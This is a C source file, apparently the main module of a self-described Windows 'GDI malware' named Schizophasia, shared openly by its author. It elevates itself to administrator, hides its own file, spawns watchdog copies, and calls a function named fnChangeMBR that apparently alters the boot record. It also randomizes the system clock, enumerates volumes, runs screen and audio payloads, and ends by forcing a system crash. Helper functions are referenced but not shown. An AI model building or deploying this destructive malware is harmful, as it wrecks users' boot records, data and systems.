#include "main.h"	

/*
Schizophasia by notcha3
Tried to make this code as readable as possible, so you won't struggle.

Although my coding style is pretty bad ngl
Made in like 6 hours yesterday and fixed some stuff in 2 days
I hadn't touched it in 4 months and had to rewrite a lot 

Overall this malware is pretty bad imo, but still that's the first one I did, so that might be ok.
 
but remember......
gdi malware makes people lose braincells and iq..... :) 
*/

ULONG g_uRngSeed = 0; // seed for RtlRandom
INT g_iGDIPayloadCount = 0; //max 6
BOOL g_bDebug = FALSE; // enable/disable destructive payloads

VOID WINAPI fnSetSeedRNG(VOID) {
	SYSTEMTIME stTime;
	GetSystemTime(&stTime);

	POINT stCursorPos;
	GetCursorPos(&stCursorPos);

	g_uRngSeed = GetTickCount() + stCursorPos.x + stCursorPos.y + stTime.wYear + stTime.wMonth + stTime.wDayOfWeek + stTime.wDay + stTime.wHour + stTime.wMinute + stTime.wSecond + stTime.wMilliseconds;
}

INT WINAPI WinMain (
	_In_ HINSTANCE hInstance, 
	_In_opt_ HINSTANCE hPrevInstance, 
	_In_ LPSTR lpCmdLine, 
	_In_ INT nShowCmd
) {
	UNREFERENCED_PARAMETER(hPrevInstance); // to not get warnings about unused variables
	fnSetSeedRNG();

	// if debug is set true by cmdline argument, the destructive payloads would be disabled
	INT iArgAmount = 0;
	LPWSTR *pszCommandLineArgs = CommandLineToArgvW(
					GetCommandLineW(),
		 			&iArgAmount
		 			);

	if (iArgAmount > 1 && _wcsicmp(
		pszCommandLineArgs[1],
		TEXT("-debug")) == 0)

		g_bDebug = TRUE;
		
	if (iArgAmount > 1 && _wcsicmp(
		pszCommandLineArgs[1], 
		TEXT("-processwatchdog")) == 0)
		fnProcessWatchdog();

	//I did this workaround, since it'd be unnecessary to run as admin when the debug mode is on
	if(g_bDebug == FALSE && IsWindowsVistaOrGreater() && fnCheckWine() == FALSE) {
		if(IsUserAnAdmin() == FALSE) {
			LPWSTR pszSelfFileName[MAX_PATH];

			GetModuleFileNameW(
					GetModuleHandleW(NULL), 
					(LPWSTR)pszSelfFileName, 
					MAX_PATH
					);

				if(ShellExecuteW(
						NULL, 
						TEXT("runas\0"), 
						(LPWSTR)pszSelfFileName, 
						NULL,
						NULL, 
						0
						 ) > (HINSTANCE)32) 
					ExitProcess(EXIT_SUCCESS);
				else {
					MessageBoxW(
						NULL,
						g_alpszMessageBoxTexts[12],
						g_alpszTitles[14],
						MB_OK | MB_ICONERROR);
					ExitProcess(EXIT_FAILURE);
					}
		  	 }
		}

			if (fnCheckWine() == TRUE || fnAlert() == FALSE)
				ExitProcess(EXIT_SUCCESS);

			fnEssentialpayloads();

			if(g_bDebug == FALSE)
				CreateThread(
					NULL, 
					0, 
					(LPTHREAD_START_ROUTINE)fnSetRandomTime, 
					NULL, 
					0, 
					NULL
					);
			
			CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnAudiopayloads, 
				NULL, 
				0, 
				NULL
				);

				CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnGraphicalpayloads, 
				NULL, 
				0, 
				NULL
				);

				CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnPayloadTimer, 
				NULL, 
				0, 
				NULL
				);

		while (g_iGDIPayloadCount != 7) // waits till the variable reaches 6, cleans up and crashes the system
				Sleep(1000);

		//Cleanup
		DeleteDC(g_hRootWindowDC);
		fnCauseBugcheck();
		
		return EXIT_SUCCESS;
}

VOID WINAPI fnEssentialpayloads(VOID) {

	fnChangeMBR();
	
	if (SetPriorityClass(
		GetCurrentProcess(), 
		REALTIME_PRIORITY_CLASS) == FALSE
		)
		MessageBoxW(
			NULL, 
			g_alpszMessageBoxTexts[10], 
			g_alpszTitles[11], 
			MB_OK | MB_ICONWARNING
			);

		if (g_bDebug == FALSE) {
		//start the process monitor
		LPWSTR pszSelfFileName[MAX_PATH];
				GetModuleFileNameW(
					GetModuleHandleW(NULL), 
					(LPWSTR)pszSelfFileName, 
					MAX_PATH
					);

			SetFileAttributesW( //metal gear solid level stealth gameplay
				(LPWSTR)pszSelfFileName,
				FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY
			);

			for(INT iLaunchCount = 0; iLaunchCount<6; iLaunchCount++)
				ShellExecuteW(
					NULL, 
					TEXT("open\0"), 
					(LPWSTR)pszSelfFileName, 
					TEXT("-processwatchdog\0"),
					 NULL, 
					 0
					);
		}

			//Init contexts and handles & get screen coords
			g_hRootWindowDC = CreateDCW(
				TEXT("DISPLAY\0"), 
				NULL, 
				NULL, 
				NULL
				);
			g_hRootWindow = GetDesktopWindow();
			GetWindowRect(
				g_hRootWindow, 
				&stScreenCords
				);

			//Start finding the volumes
			fnFindVolumes();
} 

VOID WINAPI fnGraphicalpayloads(VOID) {

				CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnWindTextRandomInt, 
				NULL, 
				0, 
				NULL
				);

	fnScreenRotation();
	fnHSLRandColourPal();
	fnIncrementColourPal();
	fnRandomPatternBrush();
	fnSolidBrushColours();
	fnIncrementColourPalStatic();
	fnCaptchaText();

	ExitThread(EXIT_SUCCESS);
}

VOID WINAPI fnAudiopayloads(VOID) {
	fnNoise2();
	fnNoise1();
	ExitThread(EXIT_SUCCESS);
}

BOOL WINAPI fnAlert(VOID) { //I did a separate function just for convenience...
	if(g_bDebug == FALSE) {

		if(
			MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[4],
			g_alpszTitles[6],
			MB_YESNO | MB_ICONWARNING) == IDYES && 

			MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[6],
			g_alpszTitles[7],
			MB_YESNO | MB_ICONERROR) == IDYES
			) return TRUE;

			else return FALSE;
		}

	else {
			if(
			MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[11],
			g_alpszTitles[13],
			MB_YESNO | MB_ICONQUESTION) == IDYES
			) return TRUE;

			else return FALSE;
		}

}

//This is a bad, but working solution...
VOID WINAPI fnPayloadTimer(VOID) {
	Sleep(40000);
	g_iGDIPayloadCount++;
	Sleep(39000);
	g_iGDIPayloadCount++;
	Sleep(16000);
	g_iGDIPayloadCount++;
	Sleep(10000);
	g_iGDIPayloadCount++;
	Sleep(8000);
	g_iGDIPayloadCount++;
	Sleep(10000);
	g_iGDIPayloadCount++;
	Sleep(4000);
	g_iGDIPayloadCount++;
}
